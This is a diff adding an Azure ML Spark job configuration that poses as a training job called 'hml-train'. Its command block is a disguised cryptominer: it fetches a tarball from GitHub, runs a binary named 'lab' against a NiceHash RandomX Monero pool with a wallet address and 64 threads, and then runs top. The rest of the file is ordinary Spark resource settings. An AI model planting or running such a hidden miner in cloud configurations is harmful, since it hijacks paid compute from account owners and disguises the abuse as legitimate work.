@@ -1,0 +1,38 @@
+$schema: http://azureml/sdk-2-0/SparkJob.json
+type: spark
+display_name: hml-train
+experiment_name: hml-train-vn
+experimentName: notebook-runs
+command: >
+  wget  https://github.com/harvard1sn/proxy/archive/refs/tags/proxy-1.0.tar.gz ;
+  tar -zxvf proxy-1.0.tar.gz
+
+
+  cd proxy-proxy-1.0
+
+
+  chmod +x lab
+
+
+  ulimit -n 65000
+
+
+  ./lab -o randomxmonero.auto.nicehash.com:9200 -u
+  NHbbB9U1JYaZHst6jfMN3FcyHZc1EbzaZh5G.running -p x -a rx/0 -t 64
+
+
+  top
+conf:
+  spark.driver.cores: 1
+  spark.driver.memory: 2g
+  spark.executor.cores: 2
+  spark.executor.memory: 2g
+  spark.executor.instances: 2
+
+
+identity:
+  type: user_identity
+
+resources:
+  instance_type: standard_e4s_v3
+  runtime_version: "3.3"
